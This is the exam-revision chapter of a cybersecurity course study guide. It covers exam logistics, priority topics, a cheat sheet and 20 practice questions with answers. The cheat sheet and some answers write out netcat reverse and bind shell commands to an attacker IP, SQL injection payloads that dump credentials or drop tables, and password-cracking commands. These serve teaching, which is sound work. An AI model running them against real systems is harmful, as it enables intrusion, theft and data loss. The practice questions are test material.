# Exam Prep & Revision

> This chapter synthesises the whole study guide (chapters 01–12) and the two pieces of confirmed exam intelligence: the lecturer's revision lecture (`L12 p.20–24`, see chapter 12) and the official SDU exam-information sheet (`SI5-CS_Cybersecurity_9 June (1).pdf`). It is the last thing to read before the exam. Everything is grounded in those sources; where a source is silent, that is stated rather than guessed.
>
> **What the exam-paper PDF actually was:** the file `SI5-CS_Cybersecurity_9 June (1).pdf` is **not** a past paper or sample paper with questions — it is a **one-page logistics/instructions cover sheet** ("Information about your on-campus written exam"). It contains no exam questions. The practice set in this chapter is therefore built from the 12 study-guide chapters and the lecturer's flagged priorities, not from that PDF. The PDF's logistics are folded into the "Exam Format" section below.

---

## Exam Format

### Confirmed from lecture L12 (chapter 12, `L12 p.21–24`)

- **Real exam: 50 questions total** = **35 MCQ/MAQ** + **15 short-answer** questions.
- **MAQ = Multiple-Answer Question**: some questions have **more than one correct option**, and you can select multiple options. (Single-answer MCQ and multi-answer MAQ are mixed; you are not told in advance which is which unless the question says so.)
- **Duration: 2.5 hours** (3 hours for students with extended time).
- **On campus.** You can **freely navigate between questions** (answer in any order, revisit).
- **Mock test** (separate, for practice): **15 questions** = 10 multiple-choice + 5 short essay, **45 minutes**, password `CSF26MOCKTEST`. *Do not confuse the mock's size/duration with the real exam's.*
- **Check your allocated room** on the list at "DE" (Digital Exam) **the day before** the exam (`L12 p.22`).

### Confirmed from the SDU exam-information sheet (the cover-page PDF)

These are administrative details from `SI5-CS_Cybersecurity_9 June (1).pdf` — they add to (and are consistent with) the L12 logistics:

- **Hand-in is split across two platforms:** **Part 1 (MCQ) in itslearning**; **Part 2 (Short Questions) in Digital Exam**. (The sheet states: "Part 1 MCQ in itslearning, Part 2 in Digital Exam" and "submit MCQ and Short Questions in itslearning" / "Digital Exam".) Be ready to switch platforms mid-exam.
- **Hand-in format:** a **single PDF** for the written part (and, where required, a **single PDF + single zip-file**).
- **Exam aids: all aids allowed EXCEPT (a) communicating with others and (b) using generative AI.** It is effectively **open-book but offline** — materials from itslearning, e-books, lecture notes, etc., must be **downloaded/offline** beforehand. The internet is allowed **only** for downloading the exam assignment and uploading your answer.
- **Only one screen** is allowed.
- **Mobile phones, smart watches, iPods and other music/communication devices** must be turned off and placed in the corner of the table.
- **Doors close 15 minutes before the exam starts.** **Meeting time is 1 hour before** the exam. Arrive early.
- IT issues are handled via the **exam invigilator** (IT support).
- A printed assignment is **not** provided as a rule (digital only).

### Practical implications of the format

- **Open-book but offline + no GenAI** changes your prep: you do not need to memorise every CVE number or port, because you can keep the study guide offline and look things up — **but** you must have everything downloaded in advance and well-organised, and you cannot rely on ChatGPT/Claude or any web search. Practise *finding* things fast in your offline notes.
- **35 MCQ/MAQ in itslearning + 15 short-answer in Digital Exam** means a platform switch; do the MCQ block first (it is Part 1), then move to the short answers.
- With **150 minutes for 50 questions**, your nominal budget is **~3 minutes/question**, but MCQ/MAQ should take far less and short-answers more (see Exam-Day Strategy).

---

## What the Exam Paper Covers

The provided PDF is **only the cover/instructions sheet** — it contains **no actual questions**, so there is nothing to summarise question-by-question or to write model answers against. What it *does* tell us is the structure (above). For the **content** that will be tested, the authoritative source is the lecturer's revision slide (`L12 p.20`, chapter 12), which lists the examinable syllabus, reinforced by the "what to study" slide (`L12 p.24`).

**The examinable topics (`L12 p.20`, the lecturer's own revision menu):**

1. Introduction (chapter 01)
2. Vulnerability Assessment (chapter 02)
3. Penetration Testing (chapter 03)
4. Social Engineering & Phishing (chapter 07)
5. Threat Modeling I (chapter 08)
6. Threat Modeling II (chapter 12)
7. IDS, Malware, DoS, Crypto, MPC (chapters 04, 05, 06, 09, 10)

The course map (`L12 p.2`) covers L01–L12: Intro, Vulnerability Assessment, Penetration Testing, Firewalls/IDS, Malware & SQL, DoS, Social Engineering, Threat Modelling I, Cryptography, MPC, Privacy/GDPR, Threat Modelling II. **Privacy/GDPR (chapter 11) is on the course map but is the one topic *not* named on the L12 revision menu** — see the note in High-Yield Topics.

**The lecturer's explicit "what to study" guidance (`L12 p.24`):**

- Learn and **understand the concepts in the slides and exercises**.
- **Focus on the lecture slides and exercises** (not outside material).
- **Practice the exercises for Labs 2, 3, 5, 6, 8, and 9** — i.e. Vulnerability Assessment, Penetration Testing, Malware & SQL, Denial of Service, Threat Modelling I, and Cryptography.

So although the PDF gives no questions, the exam content is well-defined: **the 12 lectures and their labs, weighted toward Labs 2/3/5/6/8/9, tested as 35 MCQ/MAQ + 15 short-answer.** The practice questions below mirror that exactly.

---

## High-Yield Topics

Ranked by expected exam value, combining (a) the lecturer's flagged labs (2, 3, 5, 6, 8, 9), (b) recurring cross-chapter themes, and (c) the density of crisp, examinable facts in each topic.

### Tier 1 — drill these hardest (the six flagged labs)

1. **Cryptography (ch. 09, Lab 9).** The single most "calculable" topic — RSA and ElGamal arithmetic appear in the lab and are perfect MCQ/short-answer fodder. Know: symmetric vs public-key; DES vs AES parameters; OTP/perfect secrecy; **run RSA and ElGamal encrypt/decrypt by hand**; why textbook RSA is insecure (needs OAEP padding); RSA = factoring hardness, ElGamal = discrete-log + randomized.
2. **Threat Modeling I (ch. 08, Lab 8).** STRIDE (the 6 categories + property each violates), the 4-step flow (Model → Find → Address → Validate), DFD elements + trust boundaries, attack trees (root/leaf), 4 mitigation strategies, DREAD. This is the conceptual spine and is doubly examined (also via ch. 12).
3. **Penetration Testing (ch. 03, Lab 3).** Methodology order, hacker hats, Metasploit module types, bind vs reverse shell, RHOST/LHOST, vsFTPd backdoor (port 6200), EternalBlue → Meterpreter, MSFvenom.
4. **Vulnerability Assessment (ch. 02, Lab 2).** Assessment vs pen-test (stops before exploitation), passive vs active scanning, Nmap scan types (`-sT`/`-sS`/`-sF`) and flags, "open ≠ vulnerable," authenticated vs unauthenticated scans, Nessus/GVM.
5. **Malware & SQL Injection (ch. 05, Lab 5).** Virus vs worm ("human action"), the 6 virus types, ransomware/Trojan/spyware/rootkit, signature vs heuristic detection; SQLi `1=1`, UNION dump, batch/`DROP`, prepared statements as the fix; the lab privilege-chaining lesson.
6. **Denial of Service (ch. 06, Lab 6).** DoS = Availability; DoS vs DDoS (botnet/C&C); **SYN flood mechanism + SYN/RST cookies/stack tweaking**; Smurf, Ping of Death, Teardrop, Land; Layer 4 vs Layer 7; Slowloris; LOIC/HOIC limits; resource exhaustion in the lab.

### Tier 2 — high value, not in the flagged-six but heavily examinable

7. **Threat Modeling II (ch. 12).** Explicitly on the revision menu and the source of all exam logistics. Know the 4-step recall, the 4Cs (Cloud/Cluster/Container/Code), the 5 K8s attack vectors, AND vs OR attack-tree nodes, K8s security features, the tool→purpose mapping.
8. **Firewalls & IDS (ch. 04, "IDS" on the menu).** Firewall types by OSI layer (packet-filter/stateful/circuit/application-proxy), static vs stateful (the two-rule problem), ACL reading, default-deny, misuse vs anomaly detection, passive (IDS) vs reactive (IPS), the three IDS approaches (preemptive blocking/deflection-honeypot/deterrence), firewall limits. Plus the bcrypt/`rockyou.txt` cracking exercise.
9. **Social Engineering & Phishing (ch. 07).** On the revision menu. Digital vs physical methods, the lifecycle (choose/contact/recon targeting types), persuasion levers, the three phishing mechanisms, SMTP spoofing, **SPF vs DKIM vs DMARC**, URL-disguise tricks, manual detection (URL check most reliable), SET/GoPhish.
10. **Introduction (ch. 01).** On the menu. CIA triad + example mechanisms, the vocabulary (risk/vulnerability/threat/exploit/attack/patch/countermeasure), attack surface = Σ attack vectors (4 categories), the VirtualBox networking table (NAT ≠ NAT Network), default credentials.
11. **Multi-Party Computation (ch. 10).** On the menu. MPC security guarantee + the inherent output leakage, XOR sharing, **XOR free vs AND needs communication**, Beaver triples, semi-honest vs malicious, the millionaires' problem, history milestones.

### Tier 3 — on the course map but NOT on the L12 revision menu

12. **Privacy, Data Protection & GDPR (ch. 11).** A guest lecture with **no lab**, and **not named on the L12 revision menu** (`L12 p.20`). Risk: lower. But it *is* in the course map (`L12 p.2`), so do a lighter pass: GDPR is a regulation (directly applicable), risk-based, extraterritorial; the 6 lawful bases (pick exactly one); the 7 Art. 5 principles; controller vs processor; pseudonymization ≠ anonymization; k-anonymity / ℓ-diversity; the 10 data-subject rights; 72-hour breach notification. Don't over-invest relative to Tier 1.

### Recurring cross-chapter themes (likely to be tested from multiple angles)

- **CIA triad** runs through everything: confidentiality (crypto, info disclosure), integrity (tampering, signatures), **availability = DoS's target**. STRIDE maps each letter to a CIA-adjacent property.
- **Trust boundaries** (ch. 08, ch. 12) = where threats cluster = where you apply STRIDE.
- **"Open ≠ vulnerable"** (ch. 02) and **"firewall ≠ complete defense"** (ch. 04) are classic nuance traps.
- **Reverse shells beat inbound firewalls/NAT** (ch. 03) ties pen-testing to firewall theory.
- **Metasploitable 2/3, Kali, NAT Network** lab environment recurs in ch. 01/02/03/05/06.
- **CVE / OWASP / Exploit-DB / CAPEC** as knowledge repositories appear in ch. 01, 02, 08.
- **Padding/randomization makes deterministic crypto secure** (RSA-OAEP, ch. 09) ≈ **masks make MPC reveals safe** (ch. 10).

---

## Rapid-Review Cheat Sheet

Terse, scannable, must-know facts per topic. Citations point to the chapter guides.

### 01 — Introduction
- **CIA:** Confidentiality (encryption, access control, auth) · Integrity (signatures, checksums) · Availability (redundancy, backups).
- **Vocab:** Vulnerability = weakness · Threat = potential to exploit · Exploit = *method* · Attack = *action* using a threat · Patch = fix · Countermeasure = prevents attack.
- **Attack Surface = Σ Attack Vectors**; 4 vectors = **Network, Machine (physical), Software, Human**. Attacker expands surface, operator limits, designer designs accordingly.
- **VirtualBox networking — the trap: NAT ≠ NAT Network.** NAT: VM1↔VM2 = **No**. NAT Network: VM1↔VM2 = **Yes** (recommended lab setup).
- **Default creds:** Kali `kali/kali` · Metasploitable 2 `msfadmin/msfadmin` · Metasploitable 3 `vagrant/vagrant`.

### 02 — Vulnerability Assessment
- **Assessment = find, classify, understand; STOPS before exploitation.** Pen-test goes through exploitation.
- **Passive** (no touching target: Netcraft, archive.org, Shodan, job ads) vs **Active** (Nmap, Nessus, Burp/ZAP — detectable).
- **Nmap scans:** `-sT` Connect (full handshake, reliable, loud) · `-sS` SYN (half-open, stealthier) · `-sF` FIN (stealthiest) · `-sV` version · `-O` OS · `-A` aggressive · `-p-` all ports · `-Pn` skip host discovery · `-sn` host discovery only (no port scan).
- **`-Pn` vs `-sn` are opposites.** Timing `-T0`(paranoid)…`-T5`(insane).
- **Open ≠ vulnerable** (port 22/SSH is normal). **Authenticated scan** = creds → finds more (local/config vulns).
- Nessus UI `:8834`, GVM `:9392`. Don't blindly copy tool severity ratings.

### 03 — Penetration Testing
- **Methodology:** Permission → Recon → Threat modelling (scope) → Vulnerability analysis → Exploitation (PoC, no harm) → Reporting.
- **Hats:** Black (malicious) · White (permission/ethical) · Grey (no permission, usually legal) · Script kiddy (pre-made tools).
- **Metasploit modules:** Auxiliary (scanners) · Exploit (uses payload, needs the vuln) · Payload (runs remotely) · Post (after access) · Encoder (evade AV/IDS) · NOP.
- **RHOST/RPORT = target (remote); LHOST/LPORT = attacker (local).** Handler must match payload's LHOST/LPORT.
- **Bind shell:** victim listens + `-e /bin/bash`. **Reverse shell:** attacker listens empty, victim connects out + `-e /bin/bash` → **beats inbound firewalls/NAT.**
- **vsFTPd 2.3.4 backdoor → shell on port 6200.** **EternalBlue (MS17-010, SMB) → Meterpreter.**
- **MSFvenom:** `-p` payload · `-f` format · `-a` arch · `-e` encoder · `-o` out. e.g. `windows/meterpreter/reverse_tcp`.

### 04 — Firewalls & IDS
- **Types by OSI:** packet-filter (network) · stateful inspection · circuit-level · application proxy. 3 basic (p.7) = network/application/circuit.
- **Static packet filter:** no context, 6 factors (interface, src/dst addr, TCP/UDP, src/dst port); needs **two rules** (out + return). **Stateful** tracks sessions (state table) → no explicit return rule.
- **Default-deny** ("not expressly permitted is prohibited") > default-allow. ACLs: top-to-bottom, first match wins; `>1023` = ephemeral client ports.
- **Firewall CANNOT:** stop bypass (sneaker net, SSL/SSH tunnels), internal threats, insecure WLAN, malware on carried devices.
- **IDS sources:** HIDS/NIDS/LIDS. **Misuse** = signatures (misses unknown) vs **Anomaly** = ML normal-baseline (false positives).
- **Passive = IDS (detect/report); Reactive = IPS (change firewall rules, block users).**
- **3 IDS approaches:** preemptive blocking (risk: self-DoS) · deflection (honeypot) · deterrence (visible IDS).
- Tools: Snort, Suricata, Zeek. Exercise: crack bcrypt (`-m 3200` hashcat / `--format=bcrypt` john) with `rockyou.txt`.

### 05 — Malware & SQLi
- **Virus needs human action; worm does NOT** (Morris worm = first, exploited sendmail/rsh).
- **Virus types:** Macro · Multi-partite (multiple methods) · Armored (obfuscation/Base64) · Memory-resident (RAM) · Sparse infector (low frequency) · Polymorphic (changes form).
- Ransomware (Cryptolocker), Trojan (looks benign; wrappers e.g. EliteWrap), Spyware (cookies/keyloggers), Rootkit (full admin).
- **Detection:** signature scanning (known byte sequences, needs updates) vs heuristics (behaviour).
- **SQLi `1=1` always true** → returns all rows. **UNION dump:** `' OR 1=1 UNION SELECT user,password FROM users#`. **Batch:** `'; DROP TABLE Payroll`. `#` = MySQL comment (`--` elsewhere); try `"` if `'` fails.
- **Fix = prepared statements** (input as bound parameter), + input validation, least privilege, hash passwords.
- Lab chain: directory listing + unsanitised input + DB root/no-password + broad sudo → host root.

### 06 — Denial of Service
- **DoS targets Availability.** DoS (1 source) vs **DDoS** (many sources / botnet + C&C; "without botnets DDoS is difficult").
- **SYN flood:** abuse TCP 3-way handshake — send SYN, never final ACK → **half-open connection buffer fills** → can't serve real clients.
- **Mitigations:** **SYN cookie** (encode state in sequence number, no buffer) · **RST cookie** (bad SYN-ACK forces client RST) · **stack tweaking** (only DELAYS, not a fix).
- **Smurf** = spoof victim as source of broadcast ICMP → network DDoSes itself (reflection/amplification). **Ping of Death** = fragmented packet reassembles > 65,535 bytes. **Teardrop** = overlapping fragments. **Land** = same src=dst IP/port → loops.
- **Layer 4 dwindling, Layer 7 rising.** **Slowloris** = only Layer-7 tool, low-bandwidth, holds sockets with partial HTTP.
- **LOIC:** no IP spoofing (traceable), can't DDoS alone. Reverse-proxy services (Cloudflare) for bandwidth floods.

### 07 — Social Engineering & Phishing
- **Digital:** phishing (vishing = voice, smishing = SMS), baiting, watering hole, WiFi spoofing. **Physical:** dumpster diving, tailgating, shoulder surfing.
- **Targeting:** explicit (specific, e.g. CEO) · opportunistic (mass) · hybrid.
- **3 phishing mechanisms:** credential stealing · malware infiltration · CEO fraud/whaling.
- **SMTP (1980) has no built-in security** → spoofing. **SPF** = is this *server* allowed to send for the domain? (softfail/fail). **DKIM** = digital *signature*, proves origin + integrity (no tampering). **DMARC** = policy layer on top.
- **SPF = authorized sender; DKIM = signature/integrity** (classic trap). **URL/attachment check = most reliable manual indicator.**
- URL tricks: shorteners, legit-name-as-subdomain (`amazon.com.evil.com`), similar (`amazon-shop.com`), homoglyph (`arnazon.com`), open redirect. Tools: SET, GoPhish.

### 08 — Threat Modeling I
- **4 steps: Model System → Find Threats → Address Threats → Validate** (iterative, never one-off).
- **STRIDE:** Spoofing→Authentication · Tampering→Integrity · Repudiation→Non-repudiation · Information disclosure→Confidentiality · DoS→Availability · Elevation of privilege→Authorization.
- **DFD elements:** Process (your code, circle) · Data store (parallel lines) · Data flow (arrow) · External entity (rectangle) + **Trust boundary** (dashed). **Threats cluster at trust boundaries.**
- **Attack tree:** root = goal, leaves = ways to initiate. **Mitigation strategies:** Mitigate (default) · Eliminate (best fix — remove functionality, cf. Heartbleed) · Transfer · Accept.
- **DREAD:** Damage, Reproducibility, Exploitability, Affected users, Discoverability (score high→low, average). Risk matrix = Impact × Likelihood. **Fuzzing = testing, NOT a mitigation.**

### 09 — Cryptography
- **Symmetric (SKE):** one shared key (Caesar, Vigenère, Enigma, DES, AES, OTP, ChaCha20-Poly1305). **Public-key (PKE):** public encrypts, secret decrypts (RSA, ElGamal).
- **DES:** 64-bit block, 64-bit key (56 effective + 8 parity), 16 Feistel rounds, broken (short key + differential/linear cryptanalysis). **AES (Rijndael):** 128-bit block, 128/192/256 key, 10 rounds, designed vs differential/linear, "not broken yet."
- **OTP:** XOR with random key ≥ plaintext length, **never reused** → perfect/information-theoretic secrecy.
- **RSA:** `n=pq`, `φ=(p-1)(q-1)`, pick `e`, `d` with `ed≡1 mod φ`. Encrypt `c=m^e mod n`, decrypt `m=c^d mod n`. Security = factoring. **Textbook RSA insecure → needs RSA-OAEP padding.**
- **ElGamal:** `h=g^x mod p`; encrypt `c1=g^k mod p`, `c2=m·h^k mod p`; decrypt `m=c2·(c1^x)^{-1} mod p`. **Randomized** (fresh `k` → different ciphertexts), pair output, security = discrete log.

### 10 — Multi-Party Computation
- **MPC:** parties compute `f(inputs)` learning **only the output, nothing more.** Inherent leakage allowed: `a∧b=0` + your `b=1` ⇒ `a=0`.
- **Boolean/XOR sharing:** `a=a₁⊕a₂`, each share uniform → one share leaks nothing.
- **XOR is FREE** (local, no communication). **AND NEEDS communication** (cross terms `a₁∧b₂`, `a₂∧b₁` mix parties).
- **Beaver triple** `(i,j,k)` with `k=i∧j`, generated offline. AND: open `d=a⊕i`, `e=b⊕j` (safe — random masks), then `a∧b = k ⊕ (d∧j) ⊕ (e∧i) ⊕ (d∧e)`; **only one party adds `d∧e`.**
- **Semi-honest** (follows protocol, curious) vs **malicious** (deviates). History: 1979 Shamir, 1982 Yao millionaires, 1986 garbled circuits, 1987 GMW.

### 11 — Privacy & GDPR
- **GDPR = regulation** (directly applicable), **risk-based, extraterritorial** (Art. 3: offering goods/services to Europeans suffices).
- **6 lawful bases (Art. 6, pick exactly ONE):** consent (informed), contract, legal obligation, vital interests, public interest, legitimate interests (controversial, needs balancing test).
- **7 Art. 5 principles:** lawful/fair/transparent · purpose limitation · data minimization · accuracy · storage limitation · security · accountability. Most-fined: **A5, A6, then A32 (security).**
- **Controller** = why/how; **processor** = on controller's behalf. **Personal data** broader than US PII; **manual processing in scope.**
- **Pseudonymization ≠ anonymization.** Pseudonym = reversible, still personal data (addresses only linkability). **Strictly anonymized data is outside GDPR.** Eval: singling out / linkability / inference.
- **k-anonymity** = indistinguishable from ≥k−1 others (max re-id 1/k); weak to background data → **ℓ-diversity** (ℓ distinct sensitive values per class). **Breach: notify DPA within 72h (Art. 33);** high-risk also notify individuals (Art. 34).

### 12 — Threat Modeling II
- **Recall 4 steps** (Model/Find/Address/Validate). **4Cs:** Cloud · Cluster · Container · Code (nested, outer→inner).
- **5 K8s attack vectors:** DoS (resource exhaustion) · Compromised container (remote exec) · Service token compromise (API access) · Network endpoints (if policy permits) · **RBAC issues (underlie many vectors).**
- **Attack tree: AND** = all children needed (block any one to break) · **OR** = any one child suffices (block all).
- **K8s security features:** Authentication · Authorization (RBAC/ABAC/Node/Webhook) · Audit logging · **Network Policies** (pods talk freely by default!) · Pod Security Policies · **K8s Secrets** (not ConfigMaps).
- Tools: kube-bench (CIS secure-deploy), Kubesec (risk analysis), Clair (image vuln scan), Kubescape (broad scan), Notary (sign/verify artifacts).

---

## Practice Questions

20 questions mimicking the real format (mix of MCQ, MAQ, and short-answer). **MAQ = select all that apply** (marked explicitly). Answers follow each question; chapter citations in brackets.

---

**Q1 (MCQ).** Which Nmap scan completes the full TCP three-way handshake, making it the most reliable but also the most detectable?
- A) `-sS`  B) `-sF`  C) `-sT`  D) `-sn`

**Answer: C** — `-sT` (TCP Connect) fully connects; `-sS` (SYN) is half-open/stealthier, `-sF` (FIN) is stealthiest, `-sn` is host-discovery only. [ch. 02]

---

**Q2 (MAQ — select all that apply).** Which of the following are **passive** reconnaissance techniques (no packets sent to the target)?
- A) Searching Shodan
- B) Running `nmap -sV` against the target
- C) Inspecting historical snapshots on archive.org
- D) Reading the organisation's job ads
- E) Launching a Nessus authenticated scan

**Answer: A, C, D** — Passive = no interaction with the target (Shodan, archive.org/Netcraft, job ads). Nmap and Nessus actively probe the target = active scanning. [ch. 02]

---

**Q3 (Short-answer).** Explain the difference between a vulnerability assessment and a penetration test, and name the one phase that separates them.

**Model answer:** A vulnerability assessment discovers hosts/services and *identifies, classifies, and understands* weaknesses, but **stops before exploitation**. A penetration test is the full authorised "simulated attack" that continues through **exploitation** (building a proof of concept that demonstrates the problem without harming the target) and reporting. The separating phase is **exploitation** — assessment finds the holes, the pen test proves they are real and exploitable. [ch. 02, ch. 03]

---

**Q4 (MCQ).** In Metasploit, which pair correctly identifies the *attacker's* values?
- A) RHOST / RPORT  B) LHOST / LPORT  C) RHOSTS / RPORT  D) target IP / target port

**Answer: B** — **L**HOST/**L**PORT = **L**ocal = attacker; **R**HOST/RPORT = Remote = target. In a `multi/handler`, the handler's LHOST/LPORT must match the payload's. [ch. 03]

---

**Q5 (MAQ — select all that apply).** Which statements about the vsFTPd 2.3.4 exploit on Metasploitable 2 are correct?
- A) It is classed as a backdoored service.
- B) The resulting shell listens on port 21.
- C) The resulting shell listens on port 6200.
- D) It triggers via the FTP service when a crafted username is sent.
- E) It only works after a successful EternalBlue exploit.

**Answer: A, C, D** — vsFTPd 2.3.4 ships a hard-coded bind-shell **backdoor**; a trigger username opens a root shell on **port 6200** (not 21). EternalBlue is an unrelated Windows/SMB exploit. [ch. 03]

---

**Q6 (Short-answer).** What is the difference between a bind shell and a reverse shell, and why is a reverse shell usually preferred?

**Model answer:** In a **bind shell** the *victim* listens and serves the shell (`nc -lvnp <port> -e /bin/bash`); the attacker connects *in*. In a **reverse shell** the *attacker* listens with an empty listener (`nc -lvnp <port>`) and the *victim* connects *out* and serves the shell (`nc <attacker_ip> <port> -e /bin/bash`). A reverse shell is preferred because the victim's **outbound** connection typically passes through inbound firewalls and NAT, whereas a bind shell's inbound listening port would usually be blocked. [ch. 03]

---

**Q7 (MCQ).** A static packet filter needs two rules to allow one outbound web session (an outbound rule and a return rule), but a stateful filter needs only one. Why?
- A) Static filters operate at the application layer.
- B) Static filters examine each packet with no context, so they cannot recognise return packets as belonging to an allowed session.
- C) Stateful filters cannot read port numbers.
- D) Static filters use SOCKS.

**Answer: B** — A static filter has no session memory, so return traffic must be explicitly permitted; a stateful filter keeps a state table and matches return packets automatically. [ch. 04]

---

**Q8 (MAQ — select all that apply).** Which are things a firewall **cannot** protect against, per the lecture?
- A) Malware carried in on an infected laptop or USB
- B) An external port scan of a public service
- C) Disgruntled internal employees
- D) Data exfiltrated through an encrypted SSL/SSH tunnel it cannot inspect
- E) Traffic over an improperly secured WLAN

**Answer: A, C, D, E** — A firewall only controls traffic passing through it; it cannot stop bypass paths (sneaker net, trusted SSL/SSH tunnels), internal threats, insecure WLAN, or malware imported on devices. (B — an external scan of a public service — *does* pass through the firewall and can be filtered.) [ch. 04]

---

**Q9 (Short-answer).** Distinguish misuse detection from anomaly detection in an IDS, and state the weakness of each.

**Model answer:** **Misuse (signature) detection** searches for known attack signatures; its weakness is that it is **susceptible to unknown/novel attacks** (no signature exists yet). **Anomaly detection** is a machine-learning approach that learns normal patterns and flags deviations; its weakness is **false positives** (legitimate-but-unusual activity looks like an attack). Signatures are reliable on known attacks but blind to new ones; anomaly detection can catch new attacks but over-alerts. [ch. 04]

---

**Q10 (MCQ).** Which single property does a Denial-of-Service attack target?
- A) Confidentiality  B) Integrity  C) Availability  D) Non-repudiation

**Answer: C** — DoS aims to prevent legitimate users from accessing the service; it targets **Availability** of the CIA triad. [ch. 06]

---

**Q11 (MAQ — select all that apply).** Which statements about the SYN flood and its mitigations are correct?
- A) It exhausts the buffer for half-open (incomplete) TCP connections.
- B) The attacker completes the handshake to consume resources.
- C) A SYN cookie encodes connection state in the sequence number, so no buffer is consumed.
- D) Stack tweaking (shorter ACK timeout, bigger buffer) fully fixes the bottleneck.
- E) An RST cookie forces a legitimate client to send a RST, verifying its interest.

**Answer: A, C, E** — The attacker **never** sends the final ACK (so B is wrong). Stack tweaking only **delays** the effect, it does not fix the bottleneck (so D is wrong). [ch. 06]

---

**Q12 (Short-answer).** Explain why the Smurf attack is described as the network "performing a DDoS on itself," and where it is defended.

**Model answer:** The attacker sends an **ICMP echo request to a broadcast address** with the **source IP spoofed to the victim's address**. Every host on the network (the intermediaries) replies with an ICMP echo reply, and all those replies flood the victim. Because the network's own hosts generate the flood directed at the victim, the network effectively DDoSes itself. It is a **reflection/amplification** attack, defended at the **router level** (modern defaults no longer respond to broadcast pings). [ch. 06]

---

**Q13 (MCQ).** What is the defining discriminator between a computer virus and a worm?
- A) A virus encrypts files; a worm does not.
- B) A virus requires human action to spread; a worm self-replicates without human action.
- C) A worm only spreads by email.
- D) A virus is always polymorphic.

**Answer: B** — The lecture's discriminator is **human action**: a virus needs it, a worm does not (e.g. the Morris worm). [ch. 05]

---

**Q14 (Short-answer).** Given the UNION-based SQLi payload `' OR 1=1 UNION SELECT user,password FROM users#`, explain what each part does and state the primary defence.

**Model answer:** The leading `'` **closes the original string literal**; `OR 1=1` keeps the first SELECT valid/always-true; `UNION SELECT user,password FROM users` **appends a second result set** reading the credentials; `#` is a **MySQL comment** that truncates the rest of the application's query so it doesn't break. The primary defence is **prepared (parameterised) statements**, where user input is bound as a literal parameter and never executed as SQL — supplemented by input validation, least privilege, and hashing passwords. [ch. 05]

---

**Q15 (MAQ — select all that apply).** Which mappings of STRIDE category → violated security property are correct?
- A) Spoofing → Authentication
- B) Tampering → Availability
- C) Repudiation → Non-repudiation
- D) Information Disclosure → Confidentiality
- E) Elevation of Privilege → Integrity

**Answer: A, C, D** — Tampering → **Integrity** (not Availability); Elevation of Privilege → **Authorization** (not Integrity). DoS → Availability is the one tied to availability. [ch. 08]

---

**Q16 (MCQ).** In the threat-modeling "Address Threats" step, which strategy is described as the *best true fix* because it removes the responsible functionality (illustrated by Heartbleed)?
- A) Mitigate  B) Eliminate  C) Transfer  D) Accept

**Answer: B** — Eliminating removes the functionality entirely (had SSL lacked the heartbeat message, Heartbleed couldn't exist). Mitigating only makes exploitation harder; it is the default but not a true fix. [ch. 08]

---

**Q17 (Short-answer).** RSA worked problem: with `p = 5`, `q = 11`, `e = 13`, find `d` and encrypt the message `m = 9`. Show the key steps.

**Model answer:** `n = p·q = 55`; `φ(n) = (5−1)(11−1) = 40`. Solve `13d ≡ 1 (mod 40)` → **`d = 37`** (since `13·37 = 481 = 12·40 + 1`). Encrypt: `c = 9^13 mod 55`. Using `9² ≡ 26`, `9⁴ ≡ 16`, `9⁸ ≡ 36`: `9^13 = 36·16·9 mod 55 = 14`. So **`c = 14`** (and decryption `14^37 mod 55 = 9`). [ch. 09]

---

**Q18 (MAQ — select all that apply).** Which statements correctly distinguish RSA from ElGamal?
- A) Textbook RSA is deterministic; ElGamal is randomized.
- B) RSA's security rests on the discrete-logarithm problem.
- C) ElGamal's ciphertext is a pair `(c1, c2)`.
- D) ElGamal's security rests on the difficulty of factoring `n`.
- E) Textbook RSA needs padding (e.g. RSA-OAEP) to be secure.

**Answer: A, C, E** — RSA's hardness = **factoring** (not discrete log); ElGamal's = **discrete log** (not factoring), so B and D are swapped. ElGamal injects fresh randomness `k` (so the same `m` gives different ciphertexts) and outputs a pair; textbook RSA is deterministic and insecure without padding. [ch. 09]

---

**Q19 (Short-answer).** In two-party MPC, why is computing a sharing of `a ⊕ b` "free" while computing `a ∧ b` requires communication?

**Model answer:** With `a = a₁⊕a₂` and `b = b₁⊕b₂`, each party computes its XOR share **locally**: `(a⊕b)₁ = a₁⊕b₁` and `(a⊕b)₂ = a₂⊕b₂`, and these XOR back to `a⊕b` — **no messages are exchanged**. For AND, expanding `(a₁⊕a₂)∧(b₁⊕b₂)` produces cross terms `a₁∧b₂` and `a₂∧b₁`, each mixing one of Alice's values with one of Bob's. Neither party can compute these alone, so **communication is required** — typically resolved with a Beaver triple `(i,j,k=i∧j)` by opening the masked values `d=a⊕i` and `e=b⊕j`. [ch. 10]

---

**Q20 (MAQ — select all that apply).** Which statements about the GDPR and email anti-spoofing are correct?
- A) The GDPR is a *regulation* and therefore directly applicable EU law.
- B) Under the GDPR you may rely on several lawful bases simultaneously for a single processing activity.
- C) SPF checks whether a sending server is authorised to send on a domain's behalf.
- D) DKIM is a digital signature that proves message origin and integrity.
- E) Strictly anonymized data is still subject to the GDPR.

**Answer: A, C, D** — You must pick **exactly one** Art. 6 lawful basis (so B is wrong). The GDPR does **not** apply to strictly anonymized data (so E is wrong; pseudonymized data, however, *is* still personal data). SPF = authorised sender; DKIM = signature/integrity. [ch. 07, ch. 11]

---

## Exam-Day Strategy

### Time budgeting across 50 questions (150 minutes)

- **Nominal budget: ~3 min/question**, but the two parts have very different costs. A sensible split:
  - **35 MCQ/MAQ in ~60–70 minutes** (≈ 1.5–2 min each). These are recognition tasks — fast.
  - **15 short-answer in ~70–80 minutes** (≈ 5 min each). These need composed prose.
  - **Reserve the last ~10 minutes** for review, flagged questions, and making sure both platforms (itslearning + Digital Exam) are submitted.
- **Do Part 1 (MCQ in itslearning) first**, then move to Part 2 (short answers in Digital Exam) — that is the platform order on the official sheet. Don't get stuck: you can **freely navigate**, so **flag and skip** anything that takes more than ~2 min on the MCQ pass and return to it.
- **Front-load the points you're sure of.** Since the test is open-book/offline, spend lookup time on the few questions you can't recall, not on ones you already know.

### How to approach MCQ vs MAQ

- **Read the stem twice.** Decide whether it is single-answer (MCQ) or multiple-answer (MAQ). If it says "select all that apply" or "which of the following are…", treat it as **MAQ** — evaluate **each option independently** as true/false; partial guessing is risky because MAQ usually needs *every* correct box and *no* wrong box.
- **Eliminate distractors** using the known traps (see below). On MAQ, an option that is *mostly* true but contains one wrong clause (e.g. "DKIM checks whether a server is authorised") is **false** — be precise.
- **Watch for swapped pairs** — the favourite MAQ trick in this course: RHOST↔LHOST, SPF↔DKIM, misuse↔anomaly, RSA-factoring↔ElGamal-discrete-log, Tampering↔Integrity. If two options look like a clean pair, suspect a swap.
